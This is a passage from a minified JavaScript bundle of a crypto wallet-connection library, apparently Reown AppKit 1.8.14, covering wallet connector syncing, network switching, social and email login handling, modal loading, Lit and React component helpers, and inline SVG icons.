n=Ce.getConnectorId(e),r=Rn.getProviderId(e);if(r===sn.CONNECTOR_TYPE_ANNOUNCED||r===sn.CONNECTOR_TYPE_INJECTED){if(n){const s=this.getConnectors().find(o=>{const a=o.id===n,c=o.info?.rdns===n,l=o.connectors?.some(f=>f.id===n||f.info?.rdns===n);return a||c||!!l});if(s){const{info:o,name:a,imageUrl:c}=s,l=c||this.getConnectorImage(s);this.setConnectedWalletInfo({name:a,icon:l,...o},e)}}}else if(r===sn.CONNECTOR_TYPE_WALLET_CONNECT){const i=Rn.getProvider(e);i?.session&&this.setConnectedWalletInfo({...i.session.peer.metadata,name:i.session.peer.metadata.name,icon:i.session.peer.metadata.icons?.[0]},e)}else if(n&&(n===ge.CONNECTOR_ID.COINBASE_SDK||n===ge.CONNECTOR_ID.COINBASE)){const i=this.getConnectors().find(c=>c.id===n),s=i?.name||"Coinbase Wallet",o=i?.imageUrl||this.getConnectorImage(i),a=i?.info;this.setConnectedWalletInfo({...a,name:s,icon:o},e)}}async syncBalance(e){!bre.getNetworksByNamespace(this.getCaipNetworks(),e.chainNamespace).find(r=>r.id.toString()===e.chainId?.toString())||!e.chainId||await this.updateNativeBalance(e.address,e.chainId,e.chainNamespace)}async ready(){await this.readyPromise}async updateNativeBalance(e,n,r){const i=this.getAdapter(r),s=Y.getCaipNetworkByNamespace(r,n);if(i){const o=await i.getBalance({address:e,chainId:n,caipNetwork:s,tokens:this.options.tokens});return this.setBalance(o.balance,o.symbol,r),o}}async initializeUniversalAdapter(){const e=x9e.createLogger((i,...s)=>{i&&this.handleAlertError(i),console.error(...s)}),n={projectId:this.options?.projectId,metadata:{name:this.options?.metadata?this.options?.metadata.name:"",description:this.options?.metadata?this.options?.metadata.description:"",url:this.options?.metadata?this.options?.metadata.url:"",icons:this.options?.metadata?this.options?.metadata.icons:[""]},logger:e};de.setManualWCControl(!!this.options?.manualWCControl),this.universalProvider=this.options.universalProvider??await $Ne.init(n);const r=this.universalProvider.disconnect.bind(this.universalProvider);this.universalProvider.disconnect=async()=>{try{return await r()}catch(i){if(i instanceof Error&&i.message.includes("Missing or invalid. Record was recently deleted"))return;throw i}},de.state.enableReconnect===!1&&this.universalProvider.session&&await this.universalProvider.disconnect(),this.listenWalletConnect()}listenWalletConnect(){this.universalProvider&&this.chainNamespaces.forEach(e=>{$l.listenWcProvider({universalProvider:this.universalProvider,namespace:e,onDisplayUri:n=>{ke.setUri(n)},onConnect:n=>{const{address:r}=xe.getAccount(n[0]);ke.finalizeWcConnection(r)},onDisconnect:()=>{Y.state.noAdapters&&this.resetAccount(e),ke.resetWcConnection()},onChainChanged:n=>{const r=Y.state.activeChain,i=r&&Ce.state.activeConnectorIds[r]===ge.CONNECTOR_ID.WALLET_CONNECT;if(r===e&&(Y.state.noAdapters||i)){const s=this.getCaipNetworks().find(a=>a.id.toString()===n.toString()||a.caipNetworkId.toString()===n.toString()),o=this.getCaipNetwork();if(!s){this.setUnsupportedNetwork(n);return}o?.id.toString()!==s?.id.toString()&&o?.chainNamespace===s?.chainNamespace&&this.setCaipNetwork(s)}},onAccountsChanged:n=>{const r=Y.state.activeChain,i=r&&Ce.state.activeConnectorIds[r]===ge.CONNECTOR_ID.WALLET_CONNECT;if(r===e&&(Y.state.noAdapters||i)){const s=n?.[0];s&&this.syncAccount({address:s.address,chainId:s.chainId,chainNamespace:s.chainNamespace})}}})})}createUniversalProvider(){return!this.universalProviderInitPromise&&xe.isClient()&&this.options?.projectId&&(this.universalProviderInitPromise=this.initializeUniversalAdapter()),this.universalProviderInitPromise}async getUniversalProvider(){if(!this.universalProvider)try{await this.createUniversalProvider()}catch(e){tt.sendEvent({type:"error",event:"INTERNAL_SDK_ERROR",properties:{errorType:"UniversalProviderInitError",errorMessage:e instanceof Error?e.message:"Unknown",uncaught:!1}}),console.error("AppKit:getUniversalProvider - Cannot create provider",e)}return this.universalProvider}getDisabledCaipNetworks(){const e=Y.getAllApprovedCaipNetworkIds(),n=Y.getAllRequestedCaipNetworks();return xe.sortRequestedNetworks(e,n).filter(i=>Y.isCaipNetworkDisabled(i))}handleAlertError(e){const n=Object.entries(Es.UniversalProviderErrors).find(([,{message:a}])=>e.message.includes(a)),[r,i]=n??[],{message:s,alertErrorKey:o}=i??{};if(r&&s&&!this.reportedAlertErrors[r]){const a=Es.ALERT_ERRORS[o];a&&(Yi.open(a,"error"),this.reportedAlertErrors[r]=!0)}}getAdapter(e){if(e)return this.chainAdapters?.[e]}createAdapter(e){if(!e)return;const n=e.namespace;if(!n)return;this.createClients();const r=e;r.namespace=n,r.construct({namespace:n,projectId:this.options?.projectId,networks:this.caipNetworks?.filter(({chainNamespace:i})=>i===n)}),this.chainNamespaces.includes(n)||this.chainNamespaces.push(n),this.chainAdapters&&(this.chainAdapters[n]=r)}async open(e){await this.injectModalUi(),e?.uri&&ke.setUri(e.uri);const{isSwap:n,isSend:r}=this.toModalOptions();return n(e)?kt.open({...e,data:{swap:e.arguments}}):r(e)&&e.arguments?this.openSend(e.arguments):kt.open(e)}async close(){await this.injectModalUi(),kt.close()}setLoading(e,n){kt.setLoading(e,n)}async disconnect(e){await ke.disconnect({namespace:e})}getSIWX(){return de.state.siwx}getError(){return""}getChainId(){return Y.state.activeCaipNetwork?.id}async switchNetwork(e,{throwOnFailure:n=!1}={}){const r=this.getCaipNetworks().find(i=>i.id===e.id);if(!r){Yi.open(Es.ALERT_ERRORS.SWITCH_NETWORK_NOT_FOUND,"error");return}await Y.switchActiveNetwork(r,{throwOnFailure:n})}getWalletProvider(){return Y.state.activeChain?Rn.state.providers[Y.state.activeChain]:null}getWalletProviderType(){return Rn.getProviderId(Y.state.activeChain)}subscribeProviders(e){return Rn.subscribeProviders(e)}getThemeMode(){return Ji.state.themeMode}getThemeVariables(){return Ji.state.themeVariables}setThemeMode(e){Ji.setThemeMode(e),M7(Ji.state.themeMode)}setTermsConditionsUrl(e){de.setTermsConditionsUrl(e)}setPrivacyPolicyUrl(e){de.setPrivacyPolicyUrl(e)}setThemeVariables(e){Ji.setThemeVariables(e),sOe(Ji.state.themeVariables)}subscribeTheme(e){return Ji.subscribe(e)}subscribeConnections(e){return this.remoteFeatures.multiWallet?ke.subscribe(e):(Yi.open(ge.REMOTE_FEATURES_ALERTS.MULTI_WALLET_NOT_ENABLED.DEFAULT,"info"),()=>{})}getWalletInfo(e){return e?Y.state.chains.get(e)?.accountState?.connectedWalletInfo:Y.getAccountData()?.connectedWalletInfo}getAccount(e){const n=e||Y.state.activeChain,r=Ce.getAuthConnector(n),i=Y.getAccountData(n),s=Be.getConnectedConnectorId(Y.state.activeChain),o=ke.getConnections(n);if(!n)throw new Error("AppKit:getAccount - namespace is required");const a=o.flatMap(c=>c.accounts.map(({address:l,type:f,publicKey:h})=>xe.createAccount(n,l,f||"eoa",h)));if(i)return{allAccounts:a,caipAddress:i.caipAddress,address:xe.getPlainAddress(i.caipAddress),isConnected:!!i.caipAddress,status:i.status,embeddedWalletInfo:r&&s===ge.CONNECTOR_ID.AUTH?{user:i.user?{...i.user,username:Be.getConnectedSocialUsername()}:void 0,authProvider:i.socialProvider||"email",accountType:Zr(n),isSmartAccountDeployed:!!i.smartAccountDeployed}:void 0}}subscribeAccount(e,n){const r=()=>{const i=this.getAccount(n);i&&e(i)};n?Y.subscribeChainProp("accountState",r,n):Y.subscribe(r),Ce.subscribe(r)}subscribeNetwork(e){return Y.subscribe(({activeCaipNetwork:n})=>{e({caipNetwork:n,chainId:n?.id,caipNetworkId:n?.caipNetworkId})})}subscribeWalletInfo(e,n){return n?Y.subscribeChainProp("accountState",r=>e(r?.connectedWalletInfo),n):Y.subscribeChainProp("accountState",r=>e(r?.connectedWalletInfo))}subscribeShouldUpdateToAddress(e){Y.subscribeChainProp("accountState",n=>e(n?.shouldUpdateToAddress))}subscribeCaipNetworkChange(e){Y.subscribeKey("activeCaipNetwork",e)}getState(){return ku.state}getRemoteFeatures(){return de.state.remoteFeatures}subscribeState(e){return ku.subscribe(e)}subscribeRemoteFeatures(e){return de.subscribeKey("remoteFeatures",e)}showErrorMessage(e){on.showError(e)}showSuccessMessage(e){on.showSuccess(e)}getEvent(){return{...tt.state}}subscribeEvents(e){return tt.subscribe(e)}replace(e){we.replace(e)}redirect(e){we.push(e)}popTransactionStack(e){we.popTransactionStack(e)}isOpen(){return kt.state.open}isTransactionStackEmpty(){return we.state.transactionStack.length===0}static getInstance(){return this.instance}updateFeatures(e){de.setFeatures(e)}updateRemoteFeatures(e){de.setRemoteFeatures(e)}updateOptions(e){const r={...de.state||{},...e};de.setOptions(r)}setConnectMethodsOrder(e){de.setConnectMethodsOrder(e)}setWalletFeaturesOrder(e){de.setWalletFeaturesOrder(e)}setCollapseWallets(e){de.setCollapseWallets(e)}setSocialsOrder(e){de.setSocialsOrder(e)}getConnectMethodsOrder(){return Uc.getConnectOrderMethod(de.state.features,Ce.getConnectors())}addNetwork(e,n){if(this.chainAdapters&&!this.chainAdapters[e])throw new Error(`Adapter for namespace ${e} doesn't exist`);const r=this.extendCaipNetwork(n,this.options);this.getCaipNetworks().find(i=>i.id===r.id)||Y.addNetwork(r)}removeNetwork(e,n){if(this.chainAdapters&&!this.chainAdapters[e])throw new Error(`Adapter for namespace ${e} doesn't exist`);this.getCaipNetworks().find(i=>i.id===n)&&Y.removeNetwork(e,n)}}let sW=!1;class mOe extends pOe{async onAuthProviderConnected(e){const n=Gr.userChainIdToChainNamespace(e?.chainId);if(e.message&&e.signature&&e.siwxMessage&&await As.addEmbeddedWalletSession({chainId:e.siwxMessage.chainId,accountAddress:e.address,notBefore:e.siwxMessage.notBefore,statement:e.siwxMessage.statement,resources:e.siwxMessage.resources,requestId:e.siwxMessage.requestId,issuedAt:e.siwxMessage.issuedAt,domain:e.siwxMessage.domain,uri:e.siwxMessage.uri,version:e.siwxMessage.version,nonce:e.siwxMessage.nonce},e.message,e.signature),!n)throw new Error("AppKit:onAuthProviderConnected - namespace is required");const r=n===ge.CHAIN.EVM?`eip155:${e.chainId}:${e.address}`:`${e.chainId}:${e.address}`,i=de.state.defaultAccountTypes[n],s=Zr(n),o=e.preferredAccountType||s||i;this.setCaipAddress(r,n);const{signature:a,siwxMessage:c,message:l,...f}=e,h=Y.getAccountData(n);this.setUser({...h?.user||{},...f},n),this.setSmartAccountDeployed(!!e.smartAccountDeployed,n),this.setPreferredAccountType(o,n),await Promise.all([this.syncAuthConnectorTheme(this.authProvider),this.syncAccount({address:e.address,chainId:e.chainId,chainNamespace:n})]),this.setLoading(!1,n)}setupAuthConnectorListeners(e){e.onRpcRequest(n=>{Wa.checkIfRequestExists(n)?Wa.checkIfRequestIsSafe(n)||this.handleUnsafeRPCRequest():(this.open(),console.error(Xn.RPC_METHOD_NOT_ALLOWED_MESSAGE,{method:n.method}),setTimeout(()=>{this.showErrorMessage(Xn.RPC_METHOD_NOT_ALLOWED_UI_MESSAGE)},300),e.rejectRpcRequests())}),e.onRpcError(()=>{this.isOpen()&&(this.isTransactionStackEmpty()?this.close():this.popTransactionStack("error"))}),e.onRpcSuccess((n,r)=>{const i=Wa.checkIfRequestIsSafe(r),s=this.getAddress(),o=Y.state.activeCaipNetwork;i||(s&&o?.id&&this.updateNativeBalance(s,o.id,o.chainNamespace),this.isTransactionStackEmpty()?this.close():this.popTransactionStack("success"))}),e.onNotConnected(()=>{const n=Y.state.activeChain;if(!n)throw new Error("AppKit:onNotConnected - namespace is required");Ce.getConnectorId(n)===ge.CONNECTOR_ID.AUTH&&(this.setCaipAddress(null,n),this.setLoading(!1,n))}),e.onConnect(this.onAuthProviderConnected.bind(this)),e.onSocialConnected(this.onAuthProviderConnected.bind(this)),e.onSetPreferredAccount(({address:n,type:r})=>{const i=Y.state.activeChain;if(!i)throw new Error("AppKit:onSetPreferredAccount - namespace is required");n&&this.setPreferredAccountType(r,i)})}async syncAuthConnectorTheme(e){if(!e)return;const n=Ji.getSnapshot();await e.syncTheme({themeMode:n.themeMode,themeVariables:n.themeVariables,w3mThemeVariables:SE(n.themeVariables,n.themeMode)})}async syncAuthConnector(e,n){const r=ge.AUTH_CONNECTOR_SUPPORTED_CHAINS.includes(n),i=n===Y.state.activeChain;if(!r)return;this.setLoading(!0,n);const s=e.getLoginEmailUsed();this.setLoading(s,n),s&&this.setStatus("connecting",n);const o=e.getEmail(),a=e.getUsername(),c=Y.getAccountData(n)?.user||{};this.setUser({...c,username:a,email:o},n),this.setupAuthConnectorListeners(e);const{isConnected:l}=await e.isConnected();if(n&&r&&i)if(l&&this.connectionControllerClient?.connectExternal){await e.init(),await this.syncAuthConnectorTheme(e),await this.connectionControllerClient?.connectExternal({id:ge.CONNECTOR_ID.AUTH,info:{name:ge.CONNECTOR_ID.AUTH},type:sn.CONNECTOR_TYPE_AUTH,provider:e,chainId:Y.getNetworkData(n)?.caipNetwork?.id,chain:n}),this.setStatus("connected",n);const f=Be.getConnectedSocialProvider();f?tt.sendEvent({type:"track",event:"SOCIAL_LOGIN_SUCCESS",address:this.getAddress(),properties:{provider:f,reconnect:!0}}):tt.sendEvent({type:"track",event:"CONNECT_SUCCESS",address:this.getAddress(),properties:{method:"email",name:this.universalProvider?.session?.peer?.metadata?.name||"Unknown",reconnect:!0,view:we.state.view,walletRank:void 0}})}else Ce.getConnectorId(n)===ge.CONNECTOR_ID.AUTH&&(this.setStatus("disconnected",n),Be.removeConnectedNamespace(n));this.setLoading(!1,n)}async checkExistingTelegramSocialConnection(e){try{if(!xe.isTelegram())return;const n=Be.getTelegramSocialProvider();if(!n||!xe.isClient())return;const i=new URL(window.location.href).searchParams.get("result_uri");if(!i)return;n&&Y.setAccountProp("socialProvider",n,e),await this.authProvider?.init();const s=Ce.getAuthConnector();n&&s&&(this.setLoading(!0,e),await ke.connectExternal({id:s.id,type:s.type,socialUri:i},s.chain),Be.setConnectedSocialProvider(n),Be.removeTelegramSocialProvider(),tt.sendEvent({type:"track",event:"SOCIAL_LOGIN_SUCCESS",properties:{provider:n}}))}catch(n){this.setLoading(!1,e),console.error("checkExistingSTelegramocialConnection error",n)}try{const n=new URL(window.location.href);n.searchParams.delete("result_uri"),window.history.replaceState({},document.title,n.toString())}catch(n){console.error("tma social login failed",n)}}createAuthProvider(e){if(!ge.AUTH_CONNECTOR_SUPPORTED_CHAINS.includes(e))return;const r=this.remoteFeatures?.email,i=Array.isArray(this.remoteFeatures?.socials)&&this.remoteFeatures.socials.length>0,s=r||i,a=Gr.getActiveNamespaceConnectedToAuth()||e;!this.authProvider&&this.options?.projectId&&s&&(this.authProvider=dE.getInstance({projectId:this.options.projectId,enableLogger:this.options.enableAuthLogger,chainId:this.getCaipNetwork(a)?.caipNetworkId,abortController:Es.EmbeddedWalletAbortController,onTimeout:l=>{l==="iframe_load_failed"?Yi.open(Es.ALERT_ERRORS.IFRAME_LOAD_FAILED,"error"):l==="iframe_request_timeout"?Yi.open(Es.ALERT_ERRORS.IFRAME_REQUEST_TIMEOUT,"error"):l==="unverified_domain"&&Yi.open(Es.ALERT_ERRORS.UNVERIFIED_DOMAIN,"error")},getActiveCaipNetwork:l=>V2(l),getCaipNetworks:l=>Y.getCaipNetworks(l)}),ku.subscribeOpen(l=>{!l&&this.isTransactionStackEmpty()&&this.authProvider?.rejectRpcRequests()}));const c=e===Y.state.activeChain&&de.state.enableReconnect;de.state.enableReconnect===!1?this.syncAuthConnectorTheme(this.authProvider):this.authProvider&&c&&(this.syncAuthConnector(this.authProvider,e),this.checkExistingTelegramSocialConnection(e))}createAuthProviderForAdapter(e){this.createAuthProvider(e),this.authProvider&&this.chainAdapters?.[e]?.setAuthProvider?.(this.authProvider)}initControllers(e){super.initControllers(e),this.options.excludeWalletIds&&Ge.initializeExcludedWallets({ids:this.options.excludeWalletIds})}async switchCaipNetwork(e){if(!e)return;const n=Y.state.activeChain,r=e.chainNamespace,i=this.getAddressByChainNamespace(r);if(r===n&&Y.getAccountData(r)?.caipAddress)await this.getAdapter(r)?.switchNetwork({caipNetwork:e}),this.setCaipNetwork(e);else{const a=Rn.getProviderId(n)===sn.CONNECTOR_TYPE_AUTH,c=Rn.getProviderId(r),l=c===sn.CONNECTOR_TYPE_AUTH,f=ge.AUTH_CONNECTOR_SUPPORTED_CHAINS.includes(r);if(!r)throw new Error("AppKit:switchCaipNetwork - networkNamespace is required");if((a&&c===void 0||l)&&f)try{Y.state.activeChain=e.chainNamespace,i?await this.getAdapter(r)?.switchNetwork({caipNetwork:e}):await this.connectionControllerClient?.connectExternal?.({id:ge.CONNECTOR_ID.AUTH,provider:this.authProvider,chain:r,chainId:e.id,type:sn.CONNECTOR_TYPE_AUTH,caipNetwork:e}),this.setCaipNetwork(e)}catch{await this.getAdapter(r)?.switchNetwork({caipNetwork:e})}else c===sn.CONNECTOR_TYPE_WALLET_CONNECT?(Y.state.noAdapters||await this.getAdapter(r)?.switchNetwork({caipNetwork:e}),this.setCaipNetwork(e),this.syncWalletConnectAccount()):(this.setCaipNetwork(e),i&&this.syncAccount({address:i,chainId:e.id,chainNamespace:r}))}}async initialize(e){await super.initialize(e),this.chainNamespaces?.forEach(n=>{this.createAuthProviderForAdapter(n)}),await this.injectModalUi(),ku.set({initialized:!0})}async syncIdentity({address:e,chainId:n,chainNamespace:r}){const i=`${r}:${n}`;if(this.caipNetworks?.find(a=>a.caipNetworkId===i)?.testnet){this.setProfileName(null,r),this.setProfileImage(null,r);return}const o=Ce.getConnectorId(r)===ge.CONNECTOR_ID.AUTH;try{const{name:a,avatar:c}=await this.fetchIdentity({address:e});!a&&o?await this.syncReownName(e,r):(this.setProfileName(a,r),this.setProfileImage(c,r))}catch{n!==1&&this.setProfileImage(null,r)}}syncConnectedWalletInfo(e){const n=Rn.getProviderId(e);if(n===sn.CONNECTOR_TYPE_AUTH){const r=this.authProvider;if(r){const i=Be.getConnectedSocialProvider()??"email",s=r.getEmail()??r.getUsername();this.setConnectedWalletInfo({name:n,identifier:s,social:i},e)}}else super.syncConnectedWalletInfo(e)}async injectModalUi(){if(xe.isClient()&&!sW)try{const e={...jt.DEFAULT_FEATURES,...this.options.features},n=this.remoteFeatures;if(await this.loadModalComponents(e,n),xe.isClient()&&!document.querySelector("w3m-modal")){const i=document.createElement("w3m-modal");!de.state.disableAppend&&!de.state.enableEmbedded&&document.body.insertAdjacentElement("beforeend",i)}sW=!0}catch(e){console.error("Error injecting modal UI:",e)}}async loadModalComponents(e,n){if(!xe.isClient())return;const r=[];(n.email||n.socials&&n.socials.length>0)&&r.push(pt(()=>import("./embedded-wallet-yBxBDUbi.js"),[])),n.email&&r.push(pt(()=>import("./email-BbUlwiWw.js"),__vite__mapDeps([3,4]))),n.socials&&r.push(pt(()=>import("./socials-C5MV0mgA.js"),[])),n.swaps&&n.swaps.length>0&&r.push(pt(()=>import("./swaps-BJdMrTjq.js"),__vite__mapDeps([5,6,7]))),e.send&&r.push(pt(()=>import("./send-BSibdpJl.js"),__vite__mapDeps([8,9,7,6]))),e.receive&&r.push(pt(()=>import("./receive-C49LShKM.js"),[])),n.onramp&&n.onramp.length>0&&r.push(pt(()=>import("./onramp-CTk3dDBR.js"),[])),n.payWithExchange&&r.push(pt(()=>import("./pay-with-exchange-B3YX91F0.js"),__vite__mapDeps([10,9]))),n.activity&&r.push(pt(()=>import("./transactions-Pve1ZqMr.js"),[])),(e.pay||n.payments)&&r.push(pt(()=>import("./index-29W-9EAT.js"),__vite__mapDeps([11,12]))),n.emailCapture&&r.push(pt(()=>import("./data-capture-rXOU-mxN.js"),__vite__mapDeps([13,4,14]))),await Promise.all([...r,pt(()=>Promise.resolve().then(()=>mBe),void 0),pt(()=>import("./w3m-modal-BPuMoZ3T.js"),__vite__mapDeps([15,12,6]))])}}const gOe="1.8.14";const yOe=new Set(["children","localName","ref","style","className"]),oW=new WeakMap,aW=(t,e,n,r,i)=>{const s=i?.[e];s===void 0?(t[e]=n,n==null&&e in HTMLElement.prototype&&t.removeAttribute(e)):n!==r&&((o,a,c)=>{let l=oW.get(o);l===void 0&&oW.set(o,l=new Map);let f=l.get(a);c!==void 0?f===void 0?(l.set(a,f={handleEvent:c}),o.addEventListener(a,f)):f.handleEvent=c:f!==void 0&&(l.delete(a),o.removeEventListener(a,f))})(t,s,n)},d8=({react:t,tagName:e,elementClass:n,events:r,displayName:i})=>{const s=new Set(Object.keys(r??{})),o=t.forwardRef(((a,c)=>{const l=t.useRef(new Map),f=t.useRef(null),h={},m={};for(const[b,w]of Object.entries(a))yOe.has(b)?h[b==="className"?"class":b]=w:s.has(b)||b in n.prototype?m[b]=w:h[b]=w;return t.useLayoutEffect((()=>{if(f.current===null)return;const b=new Map;for(const w in m)aW(f.current,w,a[w],l.current.get(w),r),l.current.delete(w),b.set(w,a[w]);for(const[w,y]of l.current)aW(f.current,w,void 0,y,r);l.current=b})),t.useLayoutEffect((()=>{f.current?.removeAttribute("defer-hydration")}),[]),h.suppressHydrationWarning=!0,t.createElement(e,{...h,ref:t.useCallback((b=>{f.current=b,typeof c=="function"?c(b):c!==null&&(c.current=b)}),[c])})}));return o.displayName=i??n.name,o};const bOe={attribute:!0,type:String,converter:Lx,reflect:!1,hasChanged:GB},wOe=(t=bOe,e,n)=>{const{kind:r,metadata:i}=n;let s=globalThis.litPropertyMetadata.get(i);if(s===void 0&&globalThis.litPropertyMetadata.set(i,s=new Map),r==="setter"&&((t=Object.create(t)).wrapped=!0),s.set(n.name,t),r==="accessor"){const{name:o}=n;return{set(a){const c=e.get.call(this);e.set.call(this,a),this.requestUpdate(o,c,t)},init(a){return a!==void 0&&this.C(o,void 0,t,a),a}}}if(r==="setter"){const{name:o}=n;return function(a){const c=this[o];e.call(this,a),this.requestUpdate(o,c,t)}}throw Error("Unsupported decorator location: "+r)};function ie(t){return(e,n)=>typeof n=="object"?wOe(t,e,n):((r,i,s)=>{const o=i.hasOwnProperty(s);return i.constructor.createProperty(s,r),o?Object.getOwnPropertyDescriptor(i,s):void 0})(t,e,n)}function Ee(t){return ie({...t,state:!0,attribute:!1})}const et=t=>t??bi;const Pae=Symbol.for(""),vOe=t=>{if(t?.r===Pae)return t?._$litStatic$},EOe=t=>({_$litStatic$:t,r:Pae}),cW=new Map,_Oe=t=>(e,...n)=>{const r=n.length;let i,s;const o=[],a=[];let c,l=0,f=!1;for(;l<r;){for(c=e[l];l<r&&(s=n[l],(i=vOe(s))!==void 0);)c+=i+e[++l],f=!0;l!==r&&a.push(s),o.push(c),l++}if(l===r&&o.push(e[r]),f){const h=o.join("$$lit$$");(e=cW.get(h))===void 0&&(o.raw=o,cW.set(h,e=o)),n=a}return t(e,...n)},uW=_Oe(X),AOe=Mt`<svg width="30" height="30" viewBox="0 0 30 30" fill="none">
  <g clip-path="url(#clip0_87_33)">
    <path d="M23.9367 2.29447e-07H6.05917C5.26333 -0.000218805 4.47526 0.156384 3.73997 0.46086C3.00469 0.765337 2.33661 1.21172 1.77391 1.7745C1.21121 2.33727 0.764917 3.00542 0.460542 3.74074C0.156167 4.47607 -0.000327963 5.26417 5.16031e-07 6.06V23.9433C4.48257e-07 24.7389 0.156744 25.5267 0.461276 26.2617C0.765808 26.9967 1.21216 27.6645 1.77484 28.2269C2.33752 28.7894 3.0055 29.2355 3.74061 29.5397C4.47573 29.8439 5.26358 30.0003 6.05917 30H23.9417C25.5486 29.9996 27.0895 29.3609 28.2257 28.2245C29.3618 27.0881 30 25.5469 30 23.94V6.06C29.9993 4.45241 29.3602 2.91091 28.2232 1.77449C27.0861 0.638064 25.5443 -0.000220881 23.9367 2.29447e-07Z" fill="url(#paint0_linear_87_33)"/>
    <path d="M14.8708 6.89259L15.4783 5.84259C15.5679 5.68703 15.6873 5.55064 15.8296 5.44122C15.9719 5.3318 16.1344 5.25148 16.3078 5.20486C16.4812 5.15824 16.662 5.14622 16.8401 5.1695C17.0181 5.19277 17.1898 5.25088 17.3453 5.34051C17.5009 5.43013 17.6373 5.54952 17.7467 5.69186C17.8561 5.83419 17.9364 5.99669 17.9831 6.17006C18.0297 6.34344 18.0417 6.5243 18.0184 6.70232C17.9952 6.88034 17.9371 7.05203 17.8474 7.20759L11.9949 17.3401H16.2283C17.5999 17.3401 18.3691 18.9526 17.7724 20.0701H5.36159C5.18215 20.0707 5.00436 20.0359 4.83845 19.9675C4.67254 19.8992 4.5218 19.7986 4.39492 19.6718C4.26803 19.5449 4.16751 19.3941 4.09915 19.2282C4.03079 19.0623 3.99593 18.8845 3.99659 18.7051C3.99659 17.9476 4.60492 17.3401 5.36159 17.3401H8.84159L13.2958 9.61926L11.9041 7.20426C11.738 6.89096 11.7 6.52543 11.7982 6.18469C11.8963 5.84395 12.1229 5.5546 12.4301 5.37763C12.7374 5.20065 13.1014 5.14987 13.4454 5.23599C13.7893 5.3221 14.0864 5.53838 14.2741 5.83926L14.8708 6.89259ZM9.60659 21.4759L8.29409 23.7526C8.20446 23.9082 8.08506 24.0446 7.94271 24.1541C7.80035 24.2636 7.63783 24.344 7.46441 24.3906C7.291 24.4373 7.11009 24.4493 6.93202 24.4261C6.75395 24.4028 6.58221 24.3447 6.42659 24.2551C6.27097 24.1655 6.13454 24.0461 6.02506 23.9037C5.91559 23.7613 5.83523 23.5988 5.78857 23.4254C5.74191 23.252 5.72986 23.0711 5.75311 22.893C5.77637 22.715 5.83446 22.5432 5.92409 22.3876L6.89909 20.7001C8.00159 20.3584 8.89742 20.6209 9.60659 21.4759ZM20.9066 17.3476H24.4583C25.2158 17.3476 25.8233 17.9551 25.8233 18.7126C25.8233 19.4701 25.2149 20.0776 24.4583 20.0776H22.4858L23.8166 22.3876C24.1916 23.0443 23.9708 23.8726 23.3149 24.2551C23.0006 24.4359 22.6274 24.4845 22.2772 24.3903C21.927 24.2961 21.6286 24.0667 21.4474 23.7526C19.2058 19.8643 17.5216 16.9534 16.4041 15.0151C15.2608 13.0426 16.0783 11.0626 16.8841 10.3909C17.7799 11.9293 19.1191 14.2501 20.9074 17.3476H20.9066Z" fill="white"/>
  </g>
  <defs>
    <linearGradient id="paint0_linear_87_33" x1="15" y1="2.29447e-07" x2="15" y2="30" gradientUnits="userSpaceOnUse">
      <stop stop-color="#18BFFB"/>
      <stop offset="1" stop-color="#2072F3"/>
    </linearGradient>
    <clipPath id="clip0_87_33">
      <rect width="30" height="30" fill="white"/>
    </clipPath>
  </defs>
</svg>`,COe=Mt`<svg fill="none" viewBox="0 0 40 40">
  <g clip-path="url(#a)">
    <g clip-path="url(#b)">
      <circle cx="20" cy="19.89" r="20" fill="#000" />
      <g clip-path="url(#c)">
        <path
          fill="#fff"
          d="M28.77 23.3c-.69 1.99-2.75 5.52-4.87 5.56-1.4.03-1.86-.84-3.46-.84-1.61 0-2.12.81-3.45.86-2.25.1-5.72-5.1-5.72-9.62 0-4.15 2.9-6.2 5.42-6.25 1.36-.02 2.64.92 3.47.92.83 0 2.38-1.13 4.02-.97.68.03 2.6.28 3.84 2.08-3.27 2.14-2.76 6.61.75 8.25ZM24.2 7.88c-2.47.1-4.49 2.69-4.2 4.84 2.28.17 4.47-2.39 4.2-4.84Z"
        />
      </g>
    </g>
  </g>
  <defs>
    <clipPath id="a"><rect width="40" height="40" fill="#fff" rx="20" /></clipPath>
    <clipPath id="b"><path fill="#fff" d="M0 0h40v40H0z" /></clipPath>
    <clipPath id="c"><path fill="#fff" d="M8 7.89h24v24H8z" /></clipPath>
  </defs>
</svg>`,SOe=Mt`
  <svg xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 8 11">
    <path
      fill="var(--apkt-tokens-theme-textPrimary)"
      d="M7.862 4.86c.159-1.064-.652-1.637-1.76-2.018l.36-1.443-.879-.218-.35 1.404c-.23-.058-.468-.112-.703-.166l.352-1.413-.877-.219-.36 1.442a29.02 29.02 0 0 1-.56-.132v-.005l-1.21-.302-.234.938s.652.15.638.158c.356.089.42.324.41.51l-.41 1.644a.715.715 0 0 1 .09.03l-.092-.024-.574 2.302c-.044.108-.154.27-.402.208.008.013-.639-.16-.639-.16L.227 8.403l1.142.285c.213.053.42.109.626.161l-.363 1.459.877.218.36-1.443c.239.065.472.125.7.182l-.36 1.436.879.219.363-1.456c1.497.283 2.623.17 3.097-1.185.381-1.09-.02-1.719-.807-2.129.574-.132 1.006-.51 1.12-1.289ZM5.856 7.673c-.272 1.09-2.107.5-2.702.353l.482-1.933c.595.149 2.503.443 2.22 1.58Zm.271-2.829c-.247.992-1.775.488-2.27.365l.436-1.753c.496.124 2.092.354 1.834 1.388Z"
    />
  </svg>
`,TOe=Mt`<svg width="30" height="30" viewBox="0 0 30 30" fill="none">
<path d="M14.9978 7.80003H27.4668C26.2032 5.61107 24.3857 3.79333 22.1968 2.52955C20.008 1.26577 17.525 0.600485 14.9975 0.600586C12.47 0.600687 9.98712 1.26617 7.79838 2.53012C5.60964 3.79408 3.79221 5.61197 2.52881 7.80103L8.76281 18.599L8.76881 18.598C8.13412 17.5044 7.79906 16.2628 7.79743 14.9983C7.79579 13.7339 8.12764 12.4914 8.7595 11.3961C9.39136 10.3008 10.3009 9.39159 11.3963 8.76005C12.4918 8.12851 13.7344 7.79702 14.9988 7.79903L14.9978 7.80003Z" fill="url(#paint0_linear_87_32)"/>
